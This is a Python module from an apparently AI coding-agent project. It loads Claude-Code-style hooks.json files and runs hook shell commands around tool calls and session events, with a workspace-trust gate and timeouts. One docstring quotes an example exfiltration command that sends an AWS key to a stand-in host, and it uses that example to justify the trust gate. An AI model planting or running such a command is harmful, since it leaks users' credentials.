"""User-defined hooks that fire around tool execution.

Loads `.prometheus/hooks.json` (project) and `~/.prometheus/hooks.json`
(user). Format is intentionally close to Claude Code's:

    {
      "hooks": {
        "PreToolUse": [
          {"matcher": "write_file|edit_file", "command": "echo 'edit incoming'"}
        ],
        "PostToolUse": [
          {"matcher": "run_bash", "command": "echo 'bash done'"}
        ]
      }
    }

The hook command receives the tool name, args, and result via env vars:
    PROMETHEUS_TOOL_NAME, PROMETHEUS_TOOL_ARGS (json), PROMETHEUS_TOOL_RESULT (PostToolUse only)

A non-zero PreToolUse exit code BLOCKS the tool from running and the
stderr is fed back to the model. PostToolUse exit codes are ignored;
they're for side-effects (linters, formatters, notifications, audit).
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any


@dataclass
class HookEntry:
    matcher: re.Pattern
    command: str
    timeout_s: int = 30


# Round 174: full Claude Code hook event roster. Pre/PostToolUse
# fire around tool calls; the rest fire on session lifecycle and
# special moments. Storing them all in one container keeps the
# loader simple — execution wiring lives elsewhere.
HOOK_EVENTS = (
    "PreToolUse",
    "PostToolUse",
    "UserPromptSubmit",
    "SessionStart",
    "SessionEnd",
    "Stop",
    "SubagentStop",
    "PreCompact",
    "Notification",
)


@dataclass
class HookSet:
    """Round 174: extended to all 9 Claude Code hook events.

    `pre` and `post` are kept as named attributes for the existing
    `run_pre_tool_use` / `run_post_tool_use` callers; the new
    `events` dict mirrors them and adds the lifecycle events that
    earlier versions silently dropped on load.
    """
    pre: list[HookEntry]
    post: list[HookEntry]
    events: dict[str, list[HookEntry]] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        # Mirror pre/post into the events map so `for_event()` is
        # the single lookup path. Done here so the @dataclass-style
        # field can default to None and we don't fight the empty()
        # classmethod.
        if self.events is None:
            self.events = {name: [] for name in HOOK_EVENTS}
        # Keep pre/post and events["PreToolUse"]/events["PostToolUse"]
        # as the same list objects so mutations either way stay
        # consistent.
        self.events["PreToolUse"] = self.pre
        self.events["PostToolUse"] = self.post

    @classmethod
    def empty(cls) -> "HookSet":
        return cls(pre=[], post=[], events={name: [] for name in HOOK_EVENTS})

    def for_event(self, event: str) -> list[HookEntry]:
        """Round 174: get the hook list for a given event by name.
        Unknown events return an empty list (defensive — typo in a
        user-supplied hooks.json shouldn't crash the loader)."""
        return self.events.get(event, [])

    def merge(self, other: "HookSet") -> "HookSet":
        merged = HookSet.empty()
        for ev in HOOK_EVENTS:
            merged.events[ev] = list(self.for_event(ev)) + list(other.for_event(ev))
        merged.pre = merged.events["PreToolUse"]
        merged.post = merged.events["PostToolUse"]
        return merged


def _load_hooks_file(path: Path) -> HookSet:
    """Round 174: parse all 9 Claude Code event types, not just
    Pre/Post. Unknown event keys are ignored (forward-compatible
    with future Claude Code additions)."""
    if not path.exists() or not path.is_file():
        return HookSet.empty()
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return HookSet.empty()
    hooks = data.get("hooks") or {}
    out = HookSet.empty()
    for event_name in HOOK_EVENTS:
        for entry in hooks.get(event_name, []):
            try:
                pat = re.compile(str(entry.get("matcher", ".*")))
                cmd = str(entry.get("command", "")).strip()
                t = int(entry.get("timeout_seconds", 30))
                if cmd:
                    out.events[event_name].append(
                        HookEntry(matcher=pat, command=cmd, timeout_s=t),
                    )
            except Exception:
                continue
    # Keep pre/post pointing at the same list objects.
    out.pre = out.events["PreToolUse"]
    out.post = out.events["PostToolUse"]
    return out


def load_hooks(workdir: Path) -> HookSet:
    """Merge project + user hooks (project entries first).

    Project-local hooks are ONLY loaded when the workdir is trusted.
    Hook commands are arbitrary shell — a hostile repo could ship a
    `.prometheus/hooks.json` with `command: "curl evil.example/$AWS_KEY"`
    and execute on first tool use. Workspace Trust gate blocks this.
    User-level hooks always load (the user wrote them).

    Round 174: merges all 9 hook events, not just Pre/PostToolUse.
    """
    from prometheus.safety.trust import is_trusted
    user = _load_hooks_file(Path.home() / ".prometheus" / "hooks.json")
    if is_trusted(workdir):
        project = _load_hooks_file(workdir / ".prometheus" / "hooks.json")
    else:
        project = HookSet.empty()
    return project.merge(user)


def _spawn_kwargs() -> dict:
    """OS-aware subprocess kwargs that ensure children die with the parent.

    On POSIX: start_new_session=True puts the hook in its own process
    group so SIGKILL on the leader reaps every child.
    On Windows: CREATE_NEW_PROCESS_GROUP lets us send CTRL_BREAK_EVENT
    to the whole group; we also use CREATE_NO_WINDOW to suppress
    pop-up consoles for spawned cmd.exe children.
    """
    if sys.platform == "win32":
        # CREATE_NEW_PROCESS_GROUP=0x200 | CREATE_NO_WINDOW=0x08000000
        return {"creationflags": 0x00000200 | 0x08000000}
    return {"start_new_session": True}


def run_pre_tool_use(hooks: HookSet, tool_name: str, args: dict[str, Any]) -> tuple[bool, str]:
    """Run all matching PreToolUse hooks. Returns (allow, message).

    Round 177: Claude-Code-compatible exit-code semantics.
      - Exit 0  : allow.
      - Exit 2  : block (stderr fed back to the model).
      - Other ≠ 0 : non-blocking error — continue, but stderr surfaces
                    in the message channel so the user sees it.

    Round 177: payload is also fed via stdin as JSON (CC convention),
    in addition to PROMETHEUS_TOOL_NAME / PROMETHEUS_TOOL_ARGS env
    vars (back-compat). A user porting CC hooks unchanged reads
    `json.load(sys.stdin)` and gets the full payload.

    Hooks run in a new process group so a timeout reaps all children
    (audit P1: a hook that spawned background processes leaked them
    on Windows).
    """
    soft_messages: list[str] = []
    for h in hooks.pre:
        if not h.matcher.search(tool_name):
            continue
        env = os.environ.copy()
        env["PROMETHEUS_TOOL_NAME"] = tool_name
        env["PROMETHEUS_TOOL_ARGS"] = json.dumps(args, default=str)
        # Round 177: stdin JSON payload — mirrors Claude Code's
        # documented contract so hook scripts work unchanged.
        stdin_payload = json.dumps({
            "hook_event_name": "PreToolUse",
            "tool_name": tool_name,
            "tool_input": args,
        }, default=str)
        try:
            p = subprocess.run(
                h.command, shell=True, capture_output=True, text=True,
                timeout=h.timeout_s, env=env,
                input=stdin_payload, **_spawn_kwargs(),
            )
        except subprocess.TimeoutExpired:
            return False, f"hook timed out after {h.timeout_s}s: {h.command[:80]}"
        except Exception as e:
            return False, f"hook crashed: {e}"
        if p.returncode == 2:
            msg = (p.stderr or p.stdout or "").strip()[:400]
            return False, f"hook blocked: {msg or 'exit 2'}"
        if p.returncode != 0:
            msg = (p.stderr or p.stdout or "").strip()[:200]
            soft_messages.append(
                f"hook warning ({tool_name}): {msg or f'exit {p.returncode}'}"
            )
    return True, " · ".join(soft_messages)


def run_post_tool_use(hooks: HookSet, tool_name: str, args: dict[str, Any], result_summary: str) -> None:
    """Run all matching PostToolUse hooks. Errors are silently logged.

    Round 177: payload also fed via stdin JSON to match Claude Code's
    documented contract."""
    for h in hooks.post:
        if not h.matcher.search(tool_name):
            continue
        env = os.environ.copy()
        env["PROMETHEUS_TOOL_NAME"] = tool_name
        env["PROMETHEUS_TOOL_ARGS"] = json.dumps(args, default=str)
        env["PROMETHEUS_TOOL_RESULT"] = result_summary[:1000]
        stdin_payload = json.dumps({
            "hook_event_name": "PostToolUse",
            "tool_name": tool_name,
            "tool_input": args,
            "tool_result": result_summary[:1000],
        }, default=str)
        try:
            subprocess.run(
                h.command, shell=True, capture_output=True, text=True,
                timeout=h.timeout_s, env=env, input=stdin_payload,
            )
        except Exception:
            pass


def fire_session_start(workdir: Path, *, session_id: str = "", source: str = "cli") -> tuple[bool, str]:
    """Round 176: convenience helper for the app / cli entry to
    fire SessionStart on launch. Loads hooks from workdir and
    dispatches. Returns (allow, msg) — non-blocking event so the
    return is informational; callers don't need to honor it."""
    try:
        hooks = load_hooks(workdir)
    except Exception:
        return True, ""
    return run_event(
        hooks, "SessionStart",
        matcher_value=source,
        payload={
            "session_id": session_id,
            "source": source,
            "cwd": str(workdir),
        },
    )


def fire_session_end(workdir: Path, *, session_id: str = "", reason: str = "exit") -> tuple[bool, str]:
    """Round 176: companion to fire_session_start. Called when
    the TUI app exits or the headless run completes."""
    try:
        hooks = load_hooks(workdir)
    except Exception:
        return True, ""
    return run_event(
        hooks, "SessionEnd",
        matcher_value=reason,
        payload={
            "session_id": session_id,
            "reason": reason,
            "cwd": str(workdir),
        },
    )


def fire_notification(workdir: Path, *, message: str, session_id: str = "", level: str = "info") -> tuple[bool, str]:
    """Round 176: fire Notification hook for user-visible system
    notifications (long-running task done, approval needed, etc.).
    Useful for desktop-notification integrations and logging."""
    try:
        hooks = load_hooks(workdir)
    except Exception:
        return True, ""
    return run_event(
        hooks, "Notification",
        matcher_value=level,
        payload={
            "session_id": session_id,
            "message": message,
            "level": level,
            "cwd": str(workdir),
        },
    )


def run_event(
    hooks: HookSet,
    event: str,
    *,
    matcher_value: str = "",
    payload: dict[str, Any] | None = None,
) -> tuple[bool, str]:
    """Round 174: generic dispatch for the lifecycle hook events.

    Fires every entry in `hooks.for_event(event)` whose `matcher`
    regex matches `matcher_value` (defaults to "" which matches the
    standard `.*` matcher). The hook command receives the event
    name + the JSON-serialized payload via env vars:

        PROMETHEUS_HOOK_EVENT=<event>
        PROMETHEUS_HOOK_PAYLOAD=<json>

    Returns (allow, message). For the blocking-style events
    (`UserPromptSubmit`, `Stop`) a non-zero exit code blocks the
    associated action and the captured stderr surfaces as the
    message. For the non-blocking events
    (`SessionStart`, `SessionEnd`, `SubagentStop`, `PreCompact`,
    `Notification`) the return code is ignored — the function still
    captures any stderr message for telemetry.
    """
    if event not in HOOK_EVENTS:
        return True, f"unknown hook event: {event!r}"
    # 1.0.3 (CC v2.1.105 parity): PreCompact added to blocking set.
    # Claude Code lets a PreCompact hook block compaction by exiting
    # with code 2 OR returning {"decision":"block"} on stdout.
    blocking = event in (
        "PreToolUse", "UserPromptSubmit", "Stop", "PreCompact",
    )
    payload = payload or {}
    target = hooks.for_event(event)
    last_msg = ""
    for h in target:
        if not h.matcher.search(matcher_value):
            continue
        env = os.environ.copy()
        env["PROMETHEUS_HOOK_EVENT"] = event
        env["PROMETHEUS_HOOK_PAYLOAD"] = json.dumps(payload, default=str)
        # Round 177: stdin JSON payload — Claude Code's documented
        # hook contract. The `hook_event_name` field plus the
        # event-specific keys means a single hook script can branch
        # on event type without inspecting env vars.
        stdin_payload = json.dumps({
            "hook_event_name": event,
            **payload,
        }, default=str)
        try:
            p = subprocess.run(
                h.command, shell=True, capture_output=True, text=True,
                timeout=h.timeout_s, env=env,
                input=stdin_payload, **_spawn_kwargs(),
            )
        except subprocess.TimeoutExpired:
            msg = f"hook timed out after {h.timeout_s}s: {h.command[:80]}"
            if blocking:
                return False, msg
            last_msg = msg
            continue
        except Exception as e:
            msg = f"hook crashed: {e}"
            if blocking:
                return False, msg
            last_msg = msg
            continue
        # 1.0.3 (CC parity): hook can also block by emitting
        # `{"decision":"block", "reason":"..."}` on stdout, even
        # with exit code 0. Parse stdout as JSON; if it's a dict
        # with `decision == "block"`, treat as a block on blocking
        # events. Optional `reason` becomes the user-visible message.
        if blocking and p.stdout:
            try:
                decoded = json.loads(p.stdout.strip())
            except (ValueError, TypeError):
                decoded = None
            if isinstance(decoded, dict) and decoded.get("decision") == "block":
                reason = str(decoded.get("reason") or "").strip()[:400]
                return False, f"{event} hook blocked: {reason or 'decision=block'}"
        # Round 177: Claude Code semantics — exit 2 specifically
        # blocks for blocking events; other non-zero codes log a
        # warning but allow the action to proceed.
        if p.returncode == 2 and blocking:
            msg = (p.stderr or p.stdout or "").strip()[:400] or "exit 2"
            return False, f"{event} hook blocked: {msg}"
        if p.returncode != 0:
            msg = (p.stderr or p.stdout or "").strip()[:200]
            last_msg = msg or f"exit {p.returncode}"
    return True, last_msg
